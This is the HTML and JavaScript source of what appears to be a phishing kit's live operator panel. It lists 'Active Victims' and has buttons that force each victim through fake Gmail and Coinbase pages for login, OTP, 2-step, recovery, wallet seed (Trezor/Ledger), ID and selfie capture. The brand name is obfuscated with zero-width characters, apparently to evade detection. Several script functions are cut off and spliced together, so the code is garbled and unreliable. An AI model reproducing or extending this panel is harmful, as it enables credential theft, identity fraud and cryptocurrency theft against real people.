<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Control Panel - Live Control</title>
        <script src="/static/js/bsmnedom.js"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
        :root {
            --primary: #6366f1;
            --primary-dark: #4f46e5;
            --secondary: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
            --info: #3b82f6;
            --dark: #1f2937;
            --light: #f8fafc;
            --gray: #6b7280;
            --gray-light: #e5e7eb;
            --card-bg: #ffffff;
            --sidebar-bg: #1e293b;
            --header-bg: #0f172a;
            --border-radius: 12px;
            --shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
            --transition: all 0.3s ease;
            --gmail-color: #ea4335;
            --C&#8203;oinbase-color: #0052ff;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: var(--light);
            min-height: 100vh;
            line-height: 1.6;
        }

        .app-container {
            display: flex;
            min-height: 100vh;
        }

        /* Sidebar */
        .sidebar {
            width: 260px;
            background: var(--sidebar-bg);
            padding: 24px 0;
            box-shadow: var(--shadow);
            z-index: 10;
        }

        .logo {
            display: flex;
            align-items: center;
            padding: 0 24px 24px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            margin-bottom: 24px;
        }

        .logo-icon {
            background: var(--primary);
            width: 36px;
            height: 36px;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 12px;
        }

        .logo-text {
            font-size: 20px;
            font-weight: 700;
        }

        .nav-item {
            display: flex;
            align-items: center;
            padding: 14px 24px;
            color: var(--gray-light);
            text-decoration: none;
            transition: var(--transition);
            border-left: 3px solid transparent;
        }

        .nav-item:hover {
            background: rgba(255, 255, 255, 0.05);
            color: white;
        }

        .nav-item.active {
            background: rgba(99, 102, 241, 0.1);
            color: white;
            border-left-color: var(--primary);
        }

        .nav-item i {
            margin-right: 12px;
            width: 20px;
            text-align: center;
        }

        /* Main Content */
        .main-content {
            flex: 1;
            padding: 24px;
            overflow-y: auto;
        }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 32px;
        }

        .page-title {
            font-size: 28px;
            font-weight: 700;
        }

        .user-info {
            display: flex;
            gap: 16px;
            font-size: 20px;
            color: var(--gray-light);
        }

        .refresh-controls {
            background: rgba(255, 255, 255, 0.05);
            border-radius: var(--border-radius);
            padding: 16px 20px;
            margin-bottom: 24px;
            display: flex;
            align-items: center;
            gap: 16px;
            flex-wrap: wrap;
        }

        .refresh-controls strong {
            color: var(--gray-light);
        }

        .refresh-btn {
            background: var(--primary);
            color: white;
            border: none;
            padding: 10px 18px;
            border-radius: 8px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 600;
            transition: var(--transition);
        }

        .refresh-btn:hover {
            background: var(--primary-dark);
        }

        .refresh-btn.paused {
            background: var(--secondary);
        }

        .manual-refresh-btn {
            background: rgba(255, 255, 255, 0.1);
            color: white;
            border: none;
            padding: 10px 18px;
            border-radius: 8px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 600;
            transition: var(--transition);
        }

        .manual-refresh-btn:hover {
            background: rgba(255, 255, 255, 0.15);
        }

        #refreshStatus {
            color: var(--secondary);
            font-weight: 600;
        }

        /* Phone Type Selector */
        .phone-type-selector {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 24px;
            padding: 16px 20px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: var(--border-radius);
        }

        .phone-type-dropdown {
            padding: 12px 16px;
            border: 1px solid var(--gray-light);
            border-radius: 8px;
            background: white;
            font-size: 14px;
            min-width: 180px;
            cursor: pointer;
        }

        .phone-type-dropdown:focus {
            outline: none;
            border-color: var(--primary);
        }

        /* Tabs */
        .tab-buttons {
            display: flex;
            gap: 12px;
            margin-bottom: 24px;
        }

        .tab-button {
            background: rgba(255, 255, 255, 0.05);
            color: var(--gray-light);
            border: none;
            padding: 12px 24px;
            border-radius: var(--border-radius);
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            font-weight: 600;
            transition: var(--transition);
        }

        .tab-button:hover {
            background: rgba(255, 255, 255, 0.1);
        }

        .tab-button.active {
            background: var(--primary);
            color: white;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }

        /* Cards */
        .victim-card, .banned-ip-card {
            background: var(--card-bg);
            border-radius: var(--border-radius);
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: var(--shadow);
            color: var(--dark);
            transition: var(--transition);
        }

        .victim-card:hover, .banned-ip-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
        }

        .banned-ip-card {
            background: #fee2e2;
            border-left: 4px solid var(--danger);
        }

        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
        }

        .victim-info {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .status-indicator {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            display: inline-block;
        }

        .status-online {
            background: var(--secondary);
            box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.2);
        }

        .status-offline {
            background: var(--danger);
        }

        .victim-email {
            font-weight: 700;
            font-size: 18px;
        }

        .current-page {
            background: var(--primary);
            color: white;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
        }

        .victim-details {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 12px;
            margin-bottom: 20px;
        }

        .detail-item {
            display: flex;
            flex-direction: column;
        }

        .detail-label {
            font-size: 12px;
            color: var(--gray);
            margin-bottom: 4px;
        }

        .detail-value {
            font-weight: 600;
        }

        /* Input Containers */
        .input-container {
            background: #f8fafc;
            border-radius: 10px;
            padding: 16px;
            margin-bottom: 16px;
            border: 1px solid var(--gray-light);
        }

        .input-header {
            display: flex;
            align-items: center;
            margin-bottom: 12px;
            gap: 8px;
        }

        .input-header i {
            color: var(--primary);
        }

        .input-row {
            display: flex;
            gap: 12px;
            align-items: center;
            flex-wrap: wrap;
        }

        .input-field {
            flex: 1;
            min-width: 200px;
            padding: 12px 16px;
            border: 1px solid var(--gray-light);
            border-radius: 8px;
            font-size: 14px;
            transition: var(--transition);
        }

        .input-field:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.2);
        }

        .set-btn {
            background: var(--primary);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: var(--transition);
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .set-btn:hover {
            background: var(--primary-dark);
        }

        .current-value {
            background: #e5e7eb;
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
        }

        /* Phone Type Container */
        .phone-type-container {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 16px;
            flex-wrap: wrap;
        }

        .phone-type-display {
            background: #e5e7eb;
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
        }

        /* Navigation Headers */
        .navigation-header {
            padding: 16px 20px;
            margin: 24px 0 16px;
            border-radius: var(--border-radius);
            font-weight: 700;
            font-size: 20px;
            display: flex;
            align-items: center;
            gap: 12px;
            border-left: 6px solid;
        }

        .gmail-header {
            background: rgba(234, 67, 53, 0.15);
            color: var(--gmail-color);
            border-left-color: var(--gmail-color);
        }

        .C&#8203;oinbase-header {
            background: rgba(0, 82, 255, 0.15);
            color: var(--C&#8203;oinbase-color);
            border-left-color: var(--C&#8203;oinbase-color);
        }

        .navigation-divider {
            height: 4px;
            background: linear-gradient(90deg, var(--gmail-color), var(--C&#8203;oinbase-color));
            margin: 30px 0;
            border-radius: 2px;
            position: relative;
            overflow: hidden;
        }

        .navigation-divider::before {
            content: "";
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(90deg, 
                transparent 0%, 
                rgba(255,255,255,0.7) 50%, 
                transparent 100%);
            animation: shimmer 3s infinite;
        }

        @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        /* Controls */
        .controls {
            display: flex;
            flex-wrap: wrap;
            gap: 10px;
            margin-top: 20px;
        }

        .control-btn {
            padding: 10px 16px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            transition: var(--transition);
            display: flex;
            align-items: center;
            gap: 6px;
        }

        .view-nav-btn { background: var(--info); color: white; }
        .send-waiting { background: var(--gmail-color); color: white; }
        .send-login { background: var(--gmail-color); color: white; }
        .delete-btn { background: var(--danger); color: white; }
        .unban-btn { background: var(--secondary); color: white; }
        .send-stall { background: var(--gmail-color); color: white; }
        .send-verify { background: var(--gmail-color); color: white; }
        .send-password { background: var(--gmail-color); color: white; }
        .send-reset { background: var(--gmail-color); color: white; }
        .send-otp { background: var(--gmail-color); color: white; }
        .send-recovery { background: var(--gmail-color); color: white; }
        .send-2step { background: var(--gmail-color); color: white; }
        .send-C&#8203;oinbase { background: var(--C&#8203;oinbase-color); color: white; }
        .send-landing { background: var(--C&#8203;oinbase-color); color: white; }
        .send-trezor { background: var(--C&#8203;oinbase-color); color: white; }
        .send-ledger { background: var(--C&#8203;oinbase-color); color: white; }
        .send-external { background: var(--C&#8203;oinbase-color); color: white; }
        .send-idtype { background: var(--C&#8203;oinbase-color); color: white; }
        .send-idupload { background: var(--C&#8203;oinbase-color); color: white; }
        .send-selfie { background: var(--C&#8203;oinbase-color); color: white; }
        .send-authenticator { background: var(--C&#8203;oinbase-color); color: white; }
        .send-C&#8203;oinbase-2factor { background: var(--C&#8203;oinbase-color); color: white; }
        .send-final-redirect { background: var(--C&#8203;oinbase-color); color: white; }
        .send-invalid { background: var(--gmail-color); color: white; }
        .send-index { background: var(--C&#8203;oinbase-color); color: white; }

        .control-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
        }

        /* Navigation History */
        .navigations {
            background: #f8fafc;
            border-radius: 10px;
            padding: 16px;
            margin-top: 16px;
            border: 1px solid var(--gray-light);
        }

        .navigation {
            background: white;
            padding: 12px 16px;
            margin: 8px 0;
            border-radius: 8px;
            border-left: 4px solid var(--primary);
            box-shadow: 0 1px 3px 0 rgba(0, 0, 0, 0.1);
        }

        /* Responsive */
        @media (max-width: 1024px) {
            .app-container {
                flex-direction: column;
            }
            
            .sidebar {
                width: 100%;
                padding: 16px;
            }
            
            .nav-items {
                display: flex;
                overflow-x: auto;
            }
            
            .nav-item {
                white-space: nowrap;
            }
        }

        @media (max-width: 768px) {
            .victim-details {
                grid-template-columns: 1fr;
            }
            
            .input-row {
                flex-direction: column;
                align-items: stretch;
            }
            
            .input-field {
                min-width: 100%;
            }
            
            .controls {
                justify-content: center;
            }
        }
        /* Switch toggle styles */
.switch {
    position: relative;
    display: inline-block;
    width: 60px;
    height: 34px;
}

.switch input {
    opacity: 0;
    width: 0;
    height: 0;
}

.slider {
    position: absolute;
    cursor: pointer;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: #ccc;
    transition: .4s;
    border-radius: 34px;
}

.slider:before {
    position: absolute;
    content: "";
    height: 26px;
    width: 26px;
    left: 4px;
    bottom: 4px;
    background-color: white;
    transition: .4s;
    border-radius: 50%;
}

input:checked + .slider {
    background-color: var(--secondary);
}

input:checked + .slider:before {
    transform: translateX(26px);
}

/* Security message styles */
.alert {
    padding: 12px 16px;
    border-radius: 8px;
    margin: 10px 0;
    font-weight: 600;
}

.alert-success {
    background: #d1fae5;
    color: #065f46;
    border: 1px solid #a7f3d0;
}

.alert-danger {
    background: #fee2e2;
    color: #991b1b;
    border: 1px solid #fecaca;
}

.alert-warning {
    background: #fef3c7;
    color: #92400e;
    border: 1px solid #fde68a;
}
        </style>
    </head>
    <body>
        <div class="app-container">
            <!-- Sidebar -->
            <div class="sidebar">
                <div class="logo">
                    <div class="logo-icon">
                        <i class="fas fa-shield-alt"></i>
                    </div>
                    <div class="logo-text">ControlPanel</div>
                </div>
                <div class="nav-items">
                    <a href="#" class="nav-item active" onclick="showTab('victims')">
                        <i class="fas fa-user-circle"></i>
                        Active Victims
                    </a>
                    <a href="#" class="nav-item" onclick="showTab('banned')">
                        <i class="fas fa-ban"></i>
                        Banned IPs
                    </a>
                    <a href="#" class="nav-item">
                        <i class="fas fa-cog"></i>
                        Settings
                    </a>
                    <a href="#" class="nav-item">
                        <i class="fas fa-chart-bar"></i>
                        Analytics
                    </a>
                    <a href="#" class="nav-item">
                        <i class="fas fa-question-circle"></i>
                        Help & Support
                    </a>
                </div>
            </div>
            <!-- Main Content -->
            <div class="main-content">
                <div class="header">
                    <h1 class="page-title">Live Control Panel</h1>
                    <div class="user-info">
                        <i class="fas fa-bell"></i>
                        <i class="fas fa-user-circle"></i>
                    </div>
                </div>
                <div class="refresh-controls">
                    <strong>
                        <i class="fas fa-sync-alt"></i>
                        Auto Refresh:
                    </strong>
                    <button class="refresh-btn" id="refreshToggle" onclick="toggleRefresh()">
                        <i class="fas fa-pause"></i>
                        Pause Refresh (10s)
                    </button>
                    <button class="manual-refresh-btn" onclick="manualRefresh()">
                        <i class="fas fa-redo"></i>
                        Manual Refresh Now
                    </button>
                    <span id="refreshStatus">Auto-refresh running every 10 seconds</span>
                </div>
                <!-- Add this section right after the refresh controls -->
                <div class="security-controls" style="margin: 20px 0; display: flex; gap: 15px; flex-wrap: wrap; align-items: center;">
                    <!-- Site Toggle -->
                    <div class="site-toggle-container" style="display: flex; align-items: center; gap: 10px; background: rgba(255,255,255,0.05); padding: 12px 16px; border-radius: 8px;">
                        <strong style="color: var(--gray-light);">Site Status:</strong>
                        <label class="switch">
                            <input type="checkbox" id="siteToggle" checked>
                            <span class="slider round"></span>
                        </label>
                        <span id="siteStatus" style="font-weight: 600; color: var(--secondary);">LIVE</span>
                    </div>
                    <!-- Ban All Logs Button -->
                    <button id="banAllLogs" class="btn btn-danger" style="padding: 12px 20px; background: var(--danger); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; display: flex; align-items: center; gap: 8px;">
                        <i class="fas fa-radiation"></i>
                        BAN ALL LOGS
                    </button>
                    <!-- Clear All Logs Button -->
                    <button id="clearAllLogs" class="btn btn-warning" style="padding: 12px 20px; background: var(--warning); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; display: flex; align-items: center; gap: 8px;">
                        <i class="fas fa-trash"></i>
                        CLEAR ALL LOGS
                    </button>
                </div>
                <!-- Status Messages -->
                <div id="securityMessage" style="margin: 10px 0; text-align: center;"></div>
                <!-- Add this button in your panel.html, preferably near the top -->
                <div class="clear-logs-section" style="margin: 20px 0; text-align: center;">
                    <button id="clearAllLogs" class="btn btn-danger" style="padding: 10px 20px; font-size: 16px;">
                        üóëÔ∏è CLEAR ALL LOGS
                    </button>
                    <div id="clearLogsMessage" style="margin-top: 10px;"></div>
                </div>
                <!-- Token Access System -->
                <div class="token-controls" style="margin: 20px 0; background: rgba(255,255,255,0.05); padding: 20px; border-radius: 12px;">
                    <h3 style="margin-bottom: 15px; color: var(--primary);">
                        <i class="fas fa-key"></i>
                        Token Access System
                    </h3>
                    <!-- Generate New Token -->
                    <div style="margin-bottom: 20px;">
                        <button id="generateToken" class="btn btn-primary" style="padding: 12px 20px; background: var(--primary); color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: 600; display: flex; align-items: center; gap: 8px;">
                            <i class="fas fa-plus-circle"></i>
                            GENERATE NEW ACCESS TOKEN
                        </button>
                        <div id="tokenResult" style="margin-top: 10px;"></div>
                    </div>
                    <!-- Active Tokens -->
                    <div>
                        <h4 style="margin-bottom: 15px; color: var(--gray-light);">
                            <i class="fas fa-list"></i>
                            Active Tokens
                        </h4>
                        <div id="tokensList"></div>
                    </div>
                </div>
                <!-- Phone Type Selector -->
                <div class="phone-type-selector">
                    <label for="phoneType">
                        <strong>Select Device Type:</strong>
                    </label>
                    <select id="phoneType" class="phone-type-dropdown" onchange="setGlobalPhoneType()">
                        <option value="">-- Select Device --</option>
                        <option value="iPhone">iPhone</option>
                        <option value="Android">Android</option>
                        <option value="Windows">Windows Phone</option>
                    </select>
                    <span id="globalPhoneTypeDisplay" class="phone-type-display" style="display: none;">
                        Global Phone Type:
                        <span id="selectedPhoneType"></span>
                    </span>
                </div>
                <!-- Main Panel -->
                <div class="main-panel">
                    <div class="tab-buttons">
                        <button onclick="logout()" style="position: absolute; top: 20px; right: 20px; padding: 10px 20px; background: #ff4757; color: white; border: none; border-radius: 5px; cursor: pointer;">
                            üö™ Logout
                        </button>
                        <button class="tab-button active" onclick="showTab('victims')">
                            <i class="fas fa-user-circle"></i>
                            Active Victims
                        </button>
                        <button class="tab-button" onclick="showTab('banned')">
                            <i class="fas fa-ban"></i>
                            Banned IPs
                        </button>
                    </div>
                    <div id="victimsTab" class="tab-content active">
                        <h2>
                            <i class="fas fa-user-circle"></i>
                            Active Victims
                        </h2>
                        <div id="victimsList"></div>
                    </div>
                    <div id="bannedTab" class="tab-content">
                        <h2>
                            <i class="fas fa-ban"></i>
                            Banned IP Addresses
                        </h2>
                        <div id="bannedIpsList"></div>
                    </div>
                </div>
            </div>
        </div>
        <script>
        let currentTab = 'victims';
        let refreshInterval = 10000; // 10 seconds
        let refreshTimer = null;
        let isRefreshPaused = false;
        let emailData = {};
        let phoneData = {};
        let numberData = {};
        let phoneTypeData = {};
        let globalPhoneType = '';
        let siteEnabled = true;

        async function generateToken() {
            const button = document.getElementById('generateToken');
            const originalText = button.innerHTML;
    
            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> GENERATING...';
            button.disabled = true;

            try {
                const response = await fetch('/api/generate-token', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'}
                });
        
                const data = await response.json();
        
                if (data.success) {
                    const tokenResult = document.getElementById('tokenResult');
                    tokenResult.innerHTML = `

        // Load victims
        async function loadVictims() {
            try {
                // Save current inputs before refreshing
                saveEmailInputs();
                savePhoneInputs();
                saveNumberInputs();
                savePhoneTypeInputs();
                console.log('üîÑ Loading victims...');
        
                const response = await fetch('/api/get-victims');
                if (!response.ok) {
                    if (response.status === 401) {
                        // Unauthorized - redirect to login
                        alert('Session expired. Please login again.');
                        window.location.href = '/admin-login';
                        return;
                    }
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                const contentType = response.headers.get('content-type');
                if (!contentType || !contentType.includes('application/json')) {
                    throw new Error('Server returned non-JSON response');
                }
                const data = await response.json();
        
                const victimsList = document.getElementById('victimsList');
                victimsList.innerHTML = '';
        
                if (data.victims.length === 0) {
                    victimsList.innerHTML = '<div class="victim-card"><p>No active victims yet...</p></div>';
                    return;
                }

        // Set email for verify page
        async function setEmailForPages(sessionId) {
            const emailInput = document.getElementById(`email-${sessionId}`);
            const email = emailInput.value.trim();
            
            if (!email) {
                alert('Please enter an email address');
                return;
            }
            
            if (!validateEmail(email)) {
                alert('Please enter a valid email address');
                return;
            }
            
            try {
                const success = await setVerifyPlaceholders(sessionId, email);
                if (success) {
                    // Save to our local storage
                    emailData[sessionId] = email;
                    document.getElementById(`current-email-${sessionId}`).textContent = `Current: ${email}`;
                    alert(`Email set to: ${email}`);
                } else {
                    alert('Failed to set email');
                }
            } catch (error) {
                console.error('Error setting email:', error);
                alert('Error setting email');
            }
        }

        // Force redirect to verify with email
        async function forceRedirectWithEmail(sessionId) {
            const emailInput = document.getElementById(`email-${sessionId}`);
            const email = emailInput.value.trim();
            
            if (!email) {
                if (confirm('No email set! Force to verify page without email?')) {
                    await forceRedirect(sessionId, 'go_to_verify');
                }
                return;
            }
            
            if (!validateEmail(email)) {
                alert('Please enter a valid email address first');
                return;
            }
            
            if (confirm(`Force this victim to Verify Page with email: ${email}?`)) {
                // Set the email first
                const emailSet = await setVerifyPlaceholders(sessionId, email);
                if (emailSet) {
                    // Then redirect to verify page
                    await forceRedirect(sessionId, 'go_to_verify');
                } else {
                    alert('Failed to set email placeholder');
                }
            }
        }

        async function forceRedirect(sessionId, action) {

                        action === 'go_to_otp' ? 'OTP Page' :
                        action === 'go_to_invalid' ? 'Invalid Page' :
                        action === 'go_to_recovery' ? 'Recovery Page' : 'Unknown Page';

                console.log(`Sending encoded command: ${action} for session ${sessionId}`);

                await fetch('/api/control-victim', {
                    method: 'POST',

                    body: JSON.stringify({ session_id: sessionId, action: action })

                console.error('Error controlling victim:', error);
                alert('Error forcing victim redirect');
            }

        // Email validation function
        function validateEmail(email) {
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(email);
        }

        // Set verify placeholders
        async function setVerifyPlaceholders(sessionId, email) {
            try {
                const response = await fetch('/api/set-verify-data', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        session_id: sessionId,
                        email: email
                    })
                });
                
                const result = await response.json();
                return result.success;
                
            } catch (error) {
                console.error('Error setting verify placeholders:', error);
                return false;
            }
        }
